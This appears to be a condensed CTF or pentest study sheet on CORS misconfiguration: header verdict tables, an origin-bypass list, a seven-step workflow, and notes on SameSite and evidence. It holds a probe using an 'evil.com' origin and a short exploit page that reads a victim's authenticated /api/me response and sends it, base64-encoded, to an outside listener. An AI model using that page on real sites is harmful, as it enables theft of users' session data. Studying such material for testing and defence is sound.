# Summary — the CORS skill, condensed

The whole class in one file — the mental model, the workflow, the
decisions.

---

## The class in one line

A foreign-origin page reads an authenticated cross-origin response —
the `Access-Control-Allow-Origin` allows your origin AND
`Access-Control-Allow-Credentials` lets the session cookie ride.

## The two gates

```text
ACAO — which origin may READ (reflected / * / null / fixed / subdomain)
ACAC — may the credential ride (true / absent)
the vuln needs BOTH: an allowed origin AND credentials allowed.
```

## The verdict table

```text
reflected + ACAC:true   → credentialed read — THE VULN
null + ACAC:true        → opaque-origin read — vuln
* (alone)               → public read — NOT the vuln
* + ACAC                → invalid — browser rejects
fixed-allowlist         → closed unless bypassable
no ACAO                 → not CORS-open
```

## The central probe

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-allow-(origin|credentials)'
```

## The SameSite gate — does the cookie ride

```text
SameSite=None+Secure → attaches → credentialed read works
SameSite=Lax/Strict  → doesn't attach → non-credentialed only
no SameSite          → Lax-by-default → doesn't attach
```

## The origin-bypass battery — naming the check

```text
reflect / null / prefix / suffix / substring / subdomain /
userinfo / query / encoded-dot / special-char / scheme / trailing-dot
```

## The workflow

```text
1. inventory the sensitive endpoints — /api/me, /api/flag, /api/token
2. measure ACAO+ACAC on the target — the Origin replay
3. name the check's shape — the bypass battery
4. check the credential — ACAC + SameSite
5. build the exploit page — fetch+exfil
6. deliver to the victim — /report, stored, data:
7. confirm the exfil — the OOB hit is the readback
```

## The exploit page

```html
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
</script>
```

## The falsifier

```text
a strict allowlist + no bypass AND no non-cookie credential —
the read is closed. a `*` on a sensitive endpoint is NOT the vuln.
```

## The confusables

```text
a READ  → web-cors       a WRITE → web-csrf
a side-channel → xs-leaks   a script-tag serve → JSONP/XSSI
a page broadcast → postMessage-hijack   a ws channel → websocket
```

## The chains

```text
the CORS-read leaks a token → a CSRF-write uses it — the canonical chain
the CORS-read leaks the flag → the read IS the exploit
the CORS-read leaks a session → a session-hijack replay
```

## The evidence bar

```text
a `confirms` needs the exfil — the data reaching your listener —
not just the ACAO header. a reflected ACAO is a candidate; the
exfil is the confirm.
```

## The trap

```text
a `*` on a sensitive endpoint is a PUBLIC read — it reads data
anyone can fetch. the vuln is a NAMED origin allowed WITH
credentials — not a wildcard.
```
